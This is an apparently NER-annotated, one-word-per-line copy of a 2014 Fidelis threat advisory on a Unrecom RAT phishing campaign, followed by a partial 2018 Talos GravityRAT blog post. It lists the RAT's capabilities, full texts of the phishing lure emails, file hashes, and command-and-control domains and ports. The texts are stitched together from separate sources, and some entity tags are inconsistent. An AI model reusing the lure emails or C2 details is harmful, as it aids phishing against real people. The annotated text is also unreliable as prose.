the
files
in
the
list
one
by
one

srf

copies
files
in
a
list
one
by
one

srmf

uses
NetUseAdd
to
connect
to
ipc$
share
of
a
target
host
,
creates
a
listing
of
files
in
the
c$
-­‐
z$
shares
of
the
target
host
,
copies
the
files
to
a
new
location
,
deletes
the
share
connection
added
using
NetuseAdd

Note
:
rows
highlighted
in
grey
denote
a
best
guess
on
functionality
;

more
analysis
needed
Fidelis
Threat
Advisory
#
1013

RAT B_malware.backdoor
in
a
jar
:
A
phishing
campaign
using
Unrecom B_malware.infosteal

May
21
,
2014

Document
Status
:

Last
Revised
:
2014-05-21

Executive
Summary

In
the
past
two
weeks
,
we
have
observed
an
increase
in
attack
activity
against
the
U.S.
state
and
local
government
,
technology
,
advisory
services
,
health
,
and
financial
sectors
through
phishing
emails
with
what
appears
to
be
a
remote
access
trojan B_malware.backdoor
(
RAT B_malware.backdoor
)
known
as
Unrecom B_malware.backdoor
.

The
attack
has
also
been
observed
against
the
financial
sector
in
Saudi
Arabia
and
Russia
.

As
Unrecom B_malware.backdoor
1
is
a
comprehensive
multi-platform
Java-based
remote
access
tool
,
currently
not
detected
by
most
AntiVirus
products
,
it
presents
a
risk
to
a
large
number
of
potential
victims
,
regardless
of
operating
system
.

The
following
is
a
screenshot
of
the
Unrecom B_malware.backdoor
RAT B_malware.backdoor
v.2.0
(
Version
in
Spanish
)
:

Over
time
,
various
reports
in
the
community
have
documented
the
evolution
of
this
tool
.

This
evolution
is
to
be
expected
,
but
its
low
detection
rate
,
recent
use
this
month
through
phishing
emails
campaigns
against
multiple
sectors
in
the
U.S.
and
association
with
past
campaigns
involving
a
variety
of
RATs B_malware.backdoor
captured
our
attention
.

The
evolution
of
Unrecom B_malware.backdoor
RAT I
dates
from
its
beginnings
as
a
tool
known
as
Frutas B_malware.infosteal
RAT I
,
subsequently
branded
as
Adwind B_malware.backdoor
RAT I
,
and
now
Unrecom B_malware.backdoor
RAT I
.

In
2013
,
it
was
reported
that
Frutas B_malware.infosteal
RAT I
was
used
in
phishing
email
campaigns
against
high
profile
companies
in
Europe
and
Asia
in
sectors
such
as
finance
,
mining
,
telecom
,
and
government
2
.

Users
are
granted
permission
to
copy
and
/
or
distribute
this
document
in
its
original
electronic
form
and
print
copies
for
personal
use
.

This
document
cannot
be
modified
or
converted
to
any
other
electronic
or
machine-readable
form
in
whole
or
in
part
without
prior
written
approval
of
Fidelis
Security
Systems
,
Inc
.

While
we
have
done
our
best
to
ensure
that
the
material
found
in
this
document
is
accuRAT
,
Fidelis
Security
Systems
,
Inc
.
makes
no
guarantee
that
the
information
contained
herein
is
error
free
.

Unrecom B_malware.backdoor
RAT I
provides
the
attacker
with
full
control
over
the
compromised
system
,
once
infected
.

It
has
some
of
the
following
capabilities
:

-
Collection
of
System
Information
(
e.g.
IP
,
OS
version
,
memory
RAM
information
,
Java
version
,
Computer
Name
,
User
account
compromised
,
etc
.
)

-
Upload
&
Execute
additional
malware
,
typically
exploiting
vulnerabilities
derived
from
collected
system
information

-
Capture
Webcam
and
Microphone
,
without
user
notification

-
Remote
Desktop
to
watch
user
activity

-
File
Manager
allowing
access
to
files
in
the
context
of
the
current
user

-
Browser
Password
theft

-
Keylogging
to
capture
passwords
otherwise
obscured
from
viewing

In
the
past
,
variants
of
the
DarkComet B_malware.backdoor
and
AcromRAT B_malware.backdoor
malware I
have
also
been
observed
beaconing
to
the
same
Command
&
Control
(
CnC
)
servers
used
by
the
Unrecom B_malware.backdoor
RAT I
in
this
campaign
.

This
document
will
provide
information
about
the
recent
phishing
campaigns
observed
with
this
RAT B_malware.backdoor
and
some
of
the
network
indicators
.

Threat
Overview

The
increased
threat
activity
against
the
U.S.
state
and
local
government
,
technology
,
advisory
services
,
and
health
sectors
in
the
past
two
weeks
is
of
great
concern
to
us
as
it
is
being
carried
through
phishing
emails
with
what
appears
to
be
a
tool
known
as
Unrecom B_malware.infosteal
RAT I
.

The
phishing
emails
try
to
trick
the
users
into
thinking
the
emails
are
legitimate
by
attaching
the
RAT B_malware.infosteal
with
the
some
of
the
following
names
:
Payment B_malware.infosteal
Invoice.jar I
,
Payment B_malware.infosteal
details.jar I
,
POR#94586.zip B_malware.infosteal
/
POR#94586.jar B_malware.infosteal
,
INV#94586.zip B_malware.infosteal
/
INV#94586.jar B_malware.infosteal
,
Invitation.jar B_malware.infosteal
,
reports-pdf.jar B_malware.infosteal
,
US$25k.jar B_malware.infosteal
,
and
DBC_BANK_IMG_23456_156.jar B_malware.infosteal
,
and
lremit_Transfer_Error_Page.jar B_malware.infosteal
.

Some
of
the
email
message
subjects
observed
during
this
campaign
are
:

Subject
:
Thank
you

Subject
:
FW
:
URGENT
CONFIRMATION
P
/
I
#
94578

Subject
:
Invitation

Subject
:
Payment
details

Subject
:
Transfer
Investigation
report

Subject
:
US$25,000
TT
COPY
ATTACHED

Subject
:
Remittance
Error
2089
/
234
-
Reported
lost
of
data
(
Complete
and
email
back
)

Subject
:
Transfer
error
,
kindly
reverse
to
us
.

It
appears
that
the
latest
version
of
this
RAT B_malware.infosteal
is
3.2
and
is
being
sold
at
'
Unrecom[.]net B_url.cncsvr
'
for
$500
(
Enterprise
Version
)
and
$200
(
Full
Version
)
.

We
find
it
interesting
that
on
their
website
,
the
authors
of
this
software
recommend
Unrecom  B_malware.backdoor
RAT I
buyers
to
not
scan
created
servers
(
malware
deployed
to
Victim
systems
)
at
Virustotal
nor
Metascan
.

This
is

indicative
of
the
adaptive
,
counter-intelligence
techniques
being
adopted
as
threat
actors
become
aware
that
many
security
researchers
use
these
services
to
gather
threat
intelligence
.

Significantly
,
malware
objects
seen
in
previous
campaigns
like
DarkComet B_malware.backdoor
and
ArcomRAT B_malware.backdoor
8
have
also
been
observed
beaconing
to
the
same
CnC
servers
Unrecom B_malware.backdoor
RAT B_malware.backdoor
is
currently
using
.

DarkComet B_malware.backdoor
is
known
to
be
a
popular
RAT B_malware.backdoor
used
in
threat
activity
in
the
Middle
East
6
,
7
.

Risk
Assessment

A
remote
access
tool
provides
an
attacker
with
full
control
over
the
victim
system
.

Once
a
system
has
been
compromised
,
the
attacker
may
install
one
or
more
backdoors
.

These
backdoors
provide
a
persistent
foothold
,
using
a
separate
command
and
control
channel
;

allowing
future
access
less
likely
to
be
correlated
to
the
original
activity
.

Through
its
modular
plugin
framework
,
this
particular
tool
lets
the
attacker
obtain
System
Information
(
e.g.
IP
,
OS
version
,
memory
RAM
information
,
Java
version
,
Computer
Name
,
User
account
compromised
,
etc
.
)
,
Upload
&
Execute
additional
malware
,
Capture
Webcam
,
Remote
Desktop
,
File
Manager
,
Browser

Password
Recovery
,
Capture
Microphone
,
Keylogger
,
etc
.

Indicators
and
Mitigation
Strategies

The
following
will
present
detailed
information
about
some
of
the
phishing
emails
observed
and
the
attached
malware
:

Invitation.jar B_malware.infosteal

File
Name
:
Invitation.jar B_malware.infosteal

File
Size
:
43866
bytes

MD5
:
859c4c667dd0f44f80b60242d93c4b0f B_hash

SHA1
:
40859bc18ea0ffa9bcf5af699336fbdbfd6be7f1 B_hash

The
'
Invitation.jar B_malware.infosteal
' I
malware I
was
sent
in
a
phishing
email
that
contained
some
of
the
following
details
:

From
Sarah
Alexander
<
mthomas3@mybluelight[.]com
>

Subject
Invitation

Date
Sun
,
4
May
2014
08:44:53
GMT

Attachment
Invitation.jar B_malware.infosteal

Reply-To
marvinflames@gmail.com

X-Originating-Ip
87.117.232[.]203 B_ip.distribute

Message
body
Hello
,
I
cordially
invite
you
to
our
anniversary
It
is
a
celebration
of
life
and
love
.

Just
like
yesterday
,
we
have
grown
maturely
in
our
relationship
.

We
are
happy
and
hope
you
can
join
us
on
our
day
.

Check
attachment
for
Venue
,
Dress
code
,
Program
event
and
Date
.

Thank
you
all
.

Sarah
and
Fred

Sunday
,
May
04
,
2014

The
greatest
education
in
the
world
is
watching
the
masters
at
work
.

-
Michael
Jackson

The
following
is
a
screenshot
of
the
email
:

The
'
Invitation.jar B_malware.infosteal
' I
malware I
beaconed
to
'
magnumbiz.no-ip[.]biz B_malware.infosteal
'
over
port
'
1505
'
.

2
.
Payment B_malware.infosteal
details.jar I

File
Name
:
Payment B_malware.infosteal
details.jar I

File
Size
:
43887
bytes

MD5
:
bd0aba05d8263fb1a9a3adcae01fc3b7 B_hash

SHA1
:
c60551e65cbe54899d1cd1f637b572455dc33b1b B_hash

The
'
Payment B_malware.infosteal
details.jar I
' I
malware I
was
sent
in
a
phishing
email
that
contained
some
of
the
following
details
:

From
Arthur
Anderson
<
alexanderharolds@arthurandersen[.]com
>

Subject
Payment
details

Date
Fri
,
16
May
2014
12:27:27
+
0000

Attachment
Payment
details.jar B_malware.infosteal

Reply-To
<
alexanderharolds@arthurandersen[.]com
>

Return-Path
alexanderharolds@arthurandersen[.]com

User-Agent
Internet
Messaging
Program
(
IMP
)
H5
(
6.1.4
)

Message
body
Attn
.

Please
find
attached
order
details
and
payment
coordinates
.

kindly
confirm
if
payment
details
attached
are
yours
so
we
can
commence
payment
.

Thank
you

Alexander
Harolds

The
following
is
a
screenshot
of
the
email
:

The
'
Payment B_malware.infosteal
details.jar I
' I
malware I
beaconed
to
'
morechedder.no-ip[.]org B_malware.infosteal
'
over
port
'
100
'
.

3
.
reports-pdf.jar B_malware.infosteal

File
Name
:
reports-pdf.jar B_malware.infosteal

File
Size
:
44237
bytes

MD5
:
39ad2cab9829ff6a1107b97f1496b499 B_hash

SHA1
:
1e9ab96ace86a45a33c4ff88a97186efb55e51fb B_hash

The
'
reports-pdf.jar B_malware.infosteal
' I
malware I
was
sent
in
a
phishing
email
that
contained
some
of
the
following
details
:

From
'
Police
Department
'
<
cmmds@sbt.co[.]in
>

Subject
Transfer
Investigation
report

Date
Mon
,
05
May
2014
07:34:35
-
0700

Attachment
reports-pdf.jar B_malware.infosteal

Message
body
We
recieved
a
report
against
the
attached
transaction
in
your
exchange
house
,
Kindly
report
to
our
nearest
station
immedietly
.

A
copy
has
been
sent
to
cso_[removed_by_analyst].com
and
investigation@policeheadquater[.]com

Police
Investigation
Department

---
Disclaimer
---
The
information
in
this
mail
is
confidential
and
is
intended
solely
for
addressee
.

Access
to
this
mail
by
anyone
else
is
unauthorised
.

Copying
or
further
distribution
beyond
the
original
recipient
may
be
unlawful
.

Any
opinion
expressed
in
this
mail
is
that
of
sender
and
does
not
necessarily
reflect
that
of
State
Bank
group
.
---

The
following
is
a
screenshot
of
the
email
:

The
'
reports-pdf.jar B_malware.infosteal
' I
malware I
beaconed
to
'
184.22.201[.]27 B_malware.infosteal
'
over
port
'
3030
'
.

4
.
US$25k.jar B_malware.infosteal

File
Name
:
US$25k.jar B_malware.infosteal

File
Size
:
43853
bytes

MD5
:
ccfbc03a5beb1adb66f058b1f5a84d98 B_hash

SHA1
:
cfd0a4d6535f6323e4423bbd07027d294887ea25 B_hash

The
'
US$25k.jar B_malware.infosteal
' I
malware I
was
sent
in
a
phishing
email
that
contained
some
of
the
following
details
:

From
'
Milker
Trading
Ltd
'
<
rbecerra@pauluhn.com[.]mx
>

Subject
US$25,000
TT
COPY
ATTACHED

Date
Wed
,
14
May
2014
03:28:43
-
0500

Attachment
US$25k.jar B_malware.infosteal

X-Get-Message-Sender-Vi
\
authenticated_id
rbecerra@pauluhn.com[.]mx B_url.distribute

X-AntiAbuse
Sender
Address
Domain
-
pauluhn.com[.]mx B_url.distribute

User-Agent
SquirrelMail
/
1.4.22

Message
body
Hello
,
We
have
not
received
any
email
from
you
again
regarding
the
previous
Inquiry
.

Please
see
attached
the
TT
Copy
of
the
USD25,000
as
directed
by
our
sales
Manager
.

Kindly
check
and
confirm
to
me
the
date
of
dispatch
of
our
last
order
.

Regards

Milker
Trading
Ltd

Auggenthal
1

94140
Ering

Mexico
.

The
'
US$25k.jar B_malware.infosteal
' I
malware I
beaconed
to
'
toba.no-ip[.]biz B_malware.infosteal
'
over
port
'
1505
'
.

5
.
Payment B_malware.infosteal
Invoice.jar I

File
Name
:
Payment B_malware.infosteal
Invoice.jar I

File
Size
:
44237
bytes

MD5
:
44f011702ff80b337124d4879607f6b1 B_hash

SHA1
:
b2474bffcbeaabdd111f3909075fc7f556901c62 B_hash



From
Johnson
Kelly
<
johnsonkelly52@live[.]com
>

Subject
Thank
you

Date
Sat
,
10
May
2014
10:45:55
-
0700

Attachment
Payment B_malware.infosteal
Invoice.jar I

Return-Path
johnsonkelly52@live[.]com

Message
Here
is
the
invoice


The
'
Payment B_malware.infosteal
Invoice.jar I
' I
malware I
beaconed
to
'
greengreen1.no-ip[.]biz B_malware.infosteal
'
over
port
'
100
'
.

6
.
INV#94586.jar B_malware.infosteal

File
Name
:
INV#94586.jar B_malware.infosteal

File
Size
:
43885
bytes

MD5
:
06c2760060d41533b36572ae3c1ba2df B_hash

SHA1
:
0350f53a821933e05bf82508b1e458c83d37b7c8 B_hash

The
'
INV#94586.jar B_malware.infosteal
' I
malware I
was
sent
in
a
phishing
email
that
contained
some
of
the
following
details
:

From
Diosdado
<
kdiosdado@lilbello[.]com
>

Subject
FW
:
URGENT
CONFIRMATION
P
/
I
#
94578

Date
11
May
2014
19:10:47
-
0700

Attachment
INV#94586.zip

Disposition
-
Notification
-
sales@ttc-qroup[.]com

Message
body
Good
Day
,

Please
find
the
attached
document
.

Regards
,

Diosdado

Procurement
Officer

Mobile
:
+966
54
073
5573

Tel
.
:
+966
13
341
9915
,
Ext
.
283

Fax
:
+966
13
340
4869

Email
:
diosdado@lilbello[.]com

P.O
Box
11976
,
Jubail
-
31961
.
SA

The
'
INV#94586.jar B_malware.infosteal
' I
malware I
beaconed
to
'
192.95.21[.]44 B_malware.infosteal
'
over
port
'
1511
'
.

Hold-transactions-pdf.jar B_malware.infosteal
,
and
verification-docx.jar B_malware.infosteal


File
Name
:
Hold-transactions-pdf.jar B_malware.infosteal
,
and
verification-docx.jar B_malware.infosteal

File
Size
:
44292
bytes

MD5
:
bc84b115d98988c5489d6acf96046b78 B_hash

SHA1
:
33731d6a7360719566391a7c4395abb090d02d0f B_hash

The
'
Hold-transactions-pdf.jar B_malware.infosteal
/
verification-docx.jar B_malware.infosteal
' I
malware I
was
sent
in
a
phishing
email
that
contained
some
of
the
following
details
:

From
'
Compliance
Verification
'
<
abdul.razzak@uaeexchange[.]com
>

Subject
ComFirm
transactions
before
release

Date
Sun
,
18
May
2014
16:31:12
-
0700

Attachment
Hold-transactions-pdf.jar B_malware.infosteal
,
and
verification-docx.jar B_malware.infosteal

Message
body
Please
urgently
confirm
the
attached
transactions
for
compliance
,
sign
and
send
a
copy
to
info@compliance.com
and
must
come
from
farralescb@alrajhibank.com.sa

Monetary
Compliance

The
following
is
a
screenshot
of
the
email
:

The
'
Hold-transactions-pdf.jar B_malware.infosteal
/
verification-docx.jar B_malware.infosteal
' I
malware I
beaconed
to
'
184.22.201[.]27 B_malware.infosteal
'
over
port
'
3030
'
.

7
.
DBC_BANK_IMG_23456_156.jar B_malware.infosteal

File
Name
:
DBC_BANK_IMG_23456_156.jar B_malware.infosteal

File
Size
:
50508
bytes

MD5
:
fca329c46f50e031597babe07fee46a8 B_hash

SHA1
:
5c1a2351749c864a38473aafe1146de4eb4de40d B_hash

The
'
DBC_BANK_IMG_23456_156.jar B_malware.infosteal
' I
malware I
is
a
corrupted
file
,
but
it
was
sent
in
a
phishing
email
that
contained
some
of
the
following
details
:

From
'
remittance@dbcbank[.]com
'
<
remittance_dbcbank1@aol[.]com
>

Subject
Remittance
Error
2089
/
234
-
Reported
lost
of
data
(
Complete
and
email
back
)

Date
Tue
,
22
Apr
2014
02:19:27
-
0400
(
EDT
)

Attachment
DBC_BANK_IMG_23456_156.jar B_malware.infosteal

X-MB-Message-Source
WebUI

X-mailer
SCM

X-Originating-IP
41.138.184[.]85 B_ip.distribute

Message
body
kindly
find
attached
our
bank
online
java
documents
for
your
reference
,
corr
=
ct
details
on
the
marked
boxes
and
email
back
to
me
.

do
not
hesitate
to
contact
me
if
need
be
.

regards

Mary
Alidu

Swift
Admin
,

Kurdsitan
Int'l
Bank
For
Inv
And
Dev

KIB
.

P.O
Box
11129
-­‐
00400
Nairobi
,
Kenya

www.dubai
-­‐
bank.co.ke

email
:
mary.alidu@dbcbank.com
remittance@dbcbank.com

Tel
:
(
+254
)
020
31109
+254-­‐66-­‐2112006

IMPORTANT
:
This
e-­‐mail
(
including
all
attachments
)
is
intended
solely
fo
<
B
=
the
use
of
individual
or
entity
to
whom
it
is
addressed
and
may
contain
confidential
and
privileged
information
.

If
you
have
received
it
in
error
,
<
=
r
>
please
contact
us
immediately
by
return
e-­‐mail
and
delete
it
from
your
system
.

Please
note
that
the
sender
shall
not
be
liable
for
the
improper
<
BR
=
this
communication
,
nor
for
any
delay
in
its
receipt
or
damage
to
your
system
.

The
following
is
a
screenshot
of
the
email
:

RAT B_malware.backdoor
in
a
jar
:
a
phishing
campaign
using
Unrecom B_malware.backdoor

8
.
lremit_Transfer_Error_Page.jar B_malware.infosteal

File
Name
:
lremit_Transfer_Error_Page.jar B_malware.infosteal

File
Size
:
43861
bytes

MD5
:
8811a91e0ef5b181b1f0433d913faaaf B_hash

SHA1
:
ca771a56a8e63565b0638e84bac0db0e6c0fadf8 B_hash

The
'
lremit_Transfer_Error_Page.jar B_malware.infosteal
' I
malware I
was
sent
in
a
phishing
email
that
contained
some
of
the
following
details
:

From

Subject

Date

Attachment

Return-Path

Message
body
'
Мишин
О.Н.
'
[
O.N.Mishin@chelindbank[.]ru
]

Transfer
error
,
kindly
reverse
to
us
.

Mon
,
5
May
2014
09:47:22
+0600
lremit_Transfer_Error_Page.jar B_malware.infosteal
<
O.N.Mishin@chelindbank[.]ru
>
--------
Original
Message
--------

Subject
:
Transfer
error
,
kindly
reverse
to
us
.

Date
:
Sun
,
4
May
2014
00:42:37
-
0400
(
EDT
)

From
:
swift@ificbankbd.com
<
he.telex@aol.com
>

To
:
[
removed_by_analyst
]

Greetings
,

Please
kindly
refund
the
attached
payment
sent
to
your
bank
,
it
was
an
application
error
from
our
bank
.

Your
sincere
cooperation
will
be
appreciated
.

Attached
is
the
proof
of
transfer
Iremit
Transfer
Error
Page

With
warm
regards

Branch
Manager

Head
Office

BDBL
Building
(
8th
-
10th
&
16th
-
19th
Floor
)
8
,
Rajuk
Avenue
G.P.O
Box
–
2229

Dhaka-1000
Bangladesh

Telephone
:
95603820

Fax
:
880-2-95602085
880-2-716344

Swift
:
IFIC
BD
DH

E-mail
:
swift@ificbankbd.com
----------------------------------------------------------------------

The
information
transmitted
,
including
any
content
in
this
communication
is
confidential
,
is
intended
only
for
the
use
of
the
intended
recipient
and
is
the
property
of
The
Western

Union
Company
or
its
affiliates
and
subsidiaries
.
If
you
are
not
the
intended
recipient
,
you
are
hereby
notified
that
any
use
of
the
information
contained
in
or
transmitted
with
the
communication
or
dissemination
,
distribution
,
or
copying
of
this
communication
is
strictly
prohibited
.
If
you
have
received
this
communication
in
error
,
please
notify
the
Western
Union
sender
immediately
by
replying
to
this
message
and
delete
the
original
message

The
following
is
a
screenshot
of
the
email
:

'
Iremit
Transfer
Error
Page
'
,
in
the
above
email
,
has
a
link
pointing
to
'
http://radaxis[.]by/images/sola/httpsiremit.com.aui-remit-to-the-philippines-cheapest-remittanceservice-for-pinoy-in-australi.zip B_malware.drop
'

The
'
lremit_Transfer_Error_Page.jar B_malware.infosteal
' I
malware I
beaconed
to
'
resultpage92.no-ip[.]biz B_malware.drop
'
over
port
'
5353
'
.

Summary
of
Indicators
:

Email
Subject

Filename

MD5
File
Hash

CnC

port

Invitation
Invitation.jar B_malware.infosteal
859c4c667dd0f44f80b60242d93c4b0f B_hash
magnumbiz.no-­‐ B_malware.infosteal
ip[.]biz I
1505

Payment
details
Payment B_malware.infosteal
details.jar I
bd0aba05d8263fb1a9a3adcae01fc3b7 B_hash
morechedder.no-­‐ B_malware.infosteal
ip[.]org I
100

Transfer
Investigation
report
reports-­‐pdf.jar B_malware.infosteal
39ad2cab9829ff6a1107b97f1496b499 B_hash
184.22.201[.]27 B_ip.distribute
3030

US$25,000
TT
COPY
ATTACHED
US$25k.jar B_malware.infosteal
ccfbc03a5beb1adb66f058b1f5a84d98 B_hash
toba.no-­‐ip[.]biz B_malware.infosteal
1505

Thank
you
Paymen B_malware.infosteal
Invoice.jar I
44f011702ff80b337124d4879607f6b1 B_hash
greengreen1.no-­‐ B_malware.infosteal
ip[.]biz I
100

INV#94586.jar B_malware.infosteal
FW
:
URGENT
CONFIRMATION
P
/
I
#
94578
06c2760060d41533b36572ae3c1ba2df B_hash
192.95.21[.]44 B_ip.distribute
1511

ComFirm
transactions
before
release
Hold-­‐transactions-­‐pdf.jar B_malware.infosteal
verification-­‐docx.jar B_malware.infosteal
bc84b115d98988c5489d6acf96046b78 B_hash
184.22.201[.]27 B_ip.distribute
3030

Remittance
Error
2089
/
234
-­‐
Reported
lost
of
data
(
Complete
and
email
back
)
DBC_BANK_IMG_23456_15 B_malware.infosteal
6.jar I
fca329c46f50e031597babe07fee46a8 B_hash
N
/
A
N
/
A

Transfer
error
,
kindly
reverse
to
us
.
lremit_Transfer_Error_Page B_malware.infosteal
.jar I
8811a91e0ef5b181b1f0433d913faaaf B_hash
resultpage92.no-­‐ B_malware.infosteal
ip[.]biz I
5353

Remittance
Error
2089
/
234
-­‐
Reported
lost
of
data
(
Complete
and
email
back
)
DBC_BANK_IMG_23456_15 B_malware.infosteal
6.jar I
8842ce373c910c012a0aa58e37b3d080 B_hash
magawalton.no-­‐ B_malware.infosteal
ip[.]biz I
1505

Further
Analysis
And
Correlation

One
simple
example
of
how
the
emails
in
this
phishing
campaign
are
related
is
that
the
Command
and
Control
node
(
184.22.201[.]27 B_ip.ddos
)
that
the
malware
communicates
with
is
shared
by
two
separate
phishing
emails
in
this
campaign
,
as
shown
in
the
diagram
below
.

Beginning
at
the
top
of
the
diagram
and
working
down
,
on
the
left
side
of
the
diagram
are
two
phishing
emails
,
the
details
of
which
are
referenced
in
the
pages
above
as
item
numbers
2
&
3
.

Of
note
,
these
phishing
emails
were
sent
to
users
at
two
separate
and
unrelated
organizations
.

As
you
can
see
,
when
compared
to
each
other
,
these
messages
appear
completely
unrelated
,
other
than
the
fact
they
both
contain
jar
files
that
are
sophomorically
'
obfuscated
'
as
pdf.jar
files
.

Note
that
both
the
subjects
,
'
Transfer
investigation
report
'
and
'
Confirm
transactions
before
release
'
are
comparatively
unique
as
are
the
senders
,
'
Police
Department
'
cmmds@sbt.co[.]in
and
Arthur
Anderson
alexanderharolds@arthurandersen[.]com
.

In
addition
to
the
fact
that
the
emails
share
no
attributes
,
the
malicious
attachments
are
also
unrelated
.

Finally
,
and
of
most
interest
in
this
diagram
,
the
central
node
at
the
bottom
of
the
diagram
,
represents
the

Command
and
Control
node
(
184.22.201[.]27 B_ip.ddos
)
used
by
these
two
examples
.

While
this
shared
resource
is
noteworthy
,
of
particular
interest
is
that
it
has
also
been
used
in
other
campaigns
.

On
the
right
side
of
the
diagram
are
files
used
in
two
other
campaigns
using
the
ArcomRAT B_malware.backdoor
8
and
DarkComet B_malware.backdoor
6
,
7
,
The
fact
that
they
share
the
same
command-and-control
infrastructure
as
the
Unrecom RAT B_malware.backdoor
campaign
make
this
central
node
all
the
more
interesting
.

The
Fidelis
Take

This
paper
seeks
to
highlight
this
campaign
targeting
significant
enterprises
worldwide
,
utilizing
a
Javabased
RAT B_malware.backdoor
malware I
that
is
currently
detected
by
a
small
set
of
security
tools
.

We
are
publishing
these
indicators
so
that
others
in
the
security
research
community
can
monitor
for
this
activity
and
potentially
correlate
against
other
campaigns
and
tools
that
are
being
investigated
.

Fidelis
XPSTM
,
the
Advanced
Threat
Defense
solution
from
General
Dynamics
Fidelis
Cybersecurity
Solutions
detects
all
of
the
activity
documented
in
this
paper
.

The
Fidelis
Threat
Research
Team
will
continue
to
follow
this
specific
activity
and
actively
monitor
the
ever-evolving
threat
landscape
for
the
latest
threats
to
our
customers
'
security
.

References

1
.
Adwind  B_malware.backdoor
RAT I
Rebranding
,
Nov
2013
:
http://www.crowdstrike.com/blog/adwind-rebranding/index.html B_url.normal

2
.
Targeted
Attacks
Delivering
Fruit
,
Aug
2013
:
http://www.symantec.com/connect/blogs/targeted-attacks-delivering-fruit B_url.normal

3
.
Remote
Access
Tool
Takes
Aim
with
Android
APK
Binder
,
Jul
2013
:
http://www.symantec.com/connect/blogs/remote-access-tool-takes-aim-android-apk-binder B_url.normal

4
.
Old B_malware.backdoor
Java I
RAT I
Updates
,
Includes
Litecoin
Plugin
,
Apr
2014
:
http://blog.trendmicro.com/trendlabssecurity-intelligence/old-java--updates-includes-litecoin-plugin/ B_url.normal

5
.
Cross-Platform
Frutas B_malware.infosteal
RAT I
Builder
and
Back
Door
,
Feb
2013
:
http://www.symantec.com/connect/blogs/cross-platform-frutas--builder-and-back-door B_url.normal

6
.
DarkComet B_malware.backdoor
Analysis
–
Understanding
the
Trojan B_malware.backdoor
used
in
Syrian
Uprising
,
Mar
2012
:
http://resources.infosecinstitute.com/darkcomet-analysis-syria/ B_url.normal

7
.
DarkComet B_malware.backdoor
RAT I
-
It
is
the
END
!
,
Jul
2012
:
http://www.symantec.com/connect/blogs/darkcomet--it-end B_url.normal

8
.
Tsunami
Warning
Leads
to
Arcom B_malware.backdoor
RAT I
,
Nov
2012
http://blog.trendmicro.com/trendlabs-security-intelligence/tsunami-warning-leads-to-arcom-/ B_url.normal
THURSDAY
,
APRIL
26
,
2018

GravityRAT  B_malware.drop
-
The
Two-Year
Evolution
Of
An
APT
Targeting
India

This
blog
post
is
authored
by
Warren
Mercer
and
Paul
Rascagneres
.

SUBSCRIBE
TO
OUR
FEED

Posts

Comments

Subscribe
via
Email

BLOG
ARCHIVE
▼
2018
(63)
▼
APRIL
(21)

Threat
Round
Up
for
April
20-27

GravityRAT  B_malware.drop
-
The
Two-Year
Evolution

Vulnerability
Spotlight
:
Hyland

Perceptive
Documen
...

Cryptomining
Campaign
Returns

Coal
and
Not
Diamond
...

Beers
with
Talos
EP27
:
Smart
Install
,

Vuln
Process
...

Vulnerability
Spotlight
:
Multiple

Issues
in
Foxit
...

SUMMARY

Today
,
Cisco
Talos
is
uncovering
a
new
piece
of
malware
,
which
has
remained
under
the
radar
for
the
past
two
years
while
it
continues
to
be
developed
.

Several
weeks
ago
,
we
identified
the
use
of
the
latest
version
of
this
RAT B_malware.drop
(
Remote
Access
Tool
)
.

In
this
article
,
we
will
discuss
the
technical
capabilities
,
the
evolution
,
development
and
potential
attribution
of
what
we
are
calling
GravityRAT  B_malware.drop
.

GravityRAT  B_malware.drop
has
been
under
ongoing
development
for
at
least
18
months
,
during
which
the
developer
has
implemented
new
features
.

We've
seen
file
exfiltration
,
remote
command
execution
capability
and
anti-vm
techniques
added
throughout
the
life
of
GravityRAT  B_malware.drop
.

This
consistent
evolution
beyond
standard
remote
code
execution
is
concerning
because
it
shows
determination
and
innovation
by
the
actor
.

Throughout
our
investigation
,
we
observed
several
malicious
documents
used
to
attack
victims
,
which
we
will
discuss
.

These
malicious
documents
were
used
by
the
developer
to
run
several
tests
on
the
popular
analysis
platform
VirusTotal
.

Using
VirusTotal
allowed
the
developer
to
make
changes
in
an
attempt
to
decrease
antivirus
detection
.

Although
GravityRAT  B_malware.drop
has
not
been
previously
published
or
discussed
,
there
was
some
information
from
the
National
Computer
Emergency
Response
Team
(
CERT
)
of
India
describing
GravityRAT  B_malware.drop
as
being
used
in
targeted
attacks
against
India
.

Finally
,
we
will
discuss
specific
attribution
elements
discovered
during
our
research
into
GravityRAT  B_malware.drop
as
we
identify
specific
information
,
which
we
believe
to
be
leaked
by
the
developer
,
such
as
location
,
and
potentially
their
first
name
.

Updates
for
BASS

Vulnerability
Spotlight
:
Foscam
IP

Video
Camera
Fi
...

Threat
Roundup
for
April
6
-
13

Vulnerability
Spotlight
:
Multiple

Vulnerabilities
...

Malware
monitor
-
leveraging

PyREBox
for
malware
a
...

Vulnerability
Spotlight
:
TALOS-20180529-531
-
Mul
...

Vulnerability
Spotlight
:
Multiple

Simple
DirectMed
...

Vulnerability
Spotlight
:
Multiple

Computerinsel
Ph
...

Microsoft
Patch
Tuesday
-
April
2018

IcedID
Banking
Trojan
Teams
up
with
Ursnif/Dreambo
...

Beers
with
Talos
EP26
:
Talos
is

Holding
a
Conferen
...

Critical
Infrastructure
at
Risk
:

Advanced
Actors
T
...

Vulnerability
Spotlight
:
Natus

NeuroWorks
Multiple
...

Vulnerability
Spotlight
:
Moxa
AWK3131A
Multiple
F
...

Fake
AV
Investigation
Unearths

KevDroid
,
New
Andro
...
►
MARCH
(10)
►
FEBRUARY
(14)
►
JANUARY
(18)
►
2017
(172)
►
2016
(98)
►
2015
(62)
►
2014
(67)
►
2013
(30)
►
2012
(53)

INFECTION
VECTORS

Malicious
Office
Documents

The
majority
of
the
malicious
documents
crafted
by
the
malware
author
are
Microsoft
Office
Word
documents
.

The
attacker
uses
an
embedded
macro
in
order
to
execute
malicious
code
on
the
victim's
system
.

The
document
opens
and
appears
as
such
:
►
2011
(23)
►
2010
(93)
►
2009
(146)
►
2008
(37)

RECOMMENDED
BLOGS

CISCO
BLOG

Talos
Threat
Round
Up
for
April
20-27

ClamAV
0.100.0
has
been
released
!

SNORT
BLOG

Snort
Subscriber
Rule
Set
Update
for
01/16/2018

The
document
asks
to
the
user
to
enable
macros
in
order
to
prove
that
the
user
is
not
a
robot
(
similar
to
the
CAPTCHA
we
often
see
on
the
internet
)
.

This
,
however
,
is
a
known
tactic
that
a
lot
of

(
similar
to
the
CAPTCHA
we
often
see
on
the
internet
)
.

This
,
however
,
is
a
known
tactic
that
a
lot
of
Office-based
malware
uses
.

It
is
an
attempt
to
trick
any
users
who
are
using
Protected
Mode
on
their
systems
.

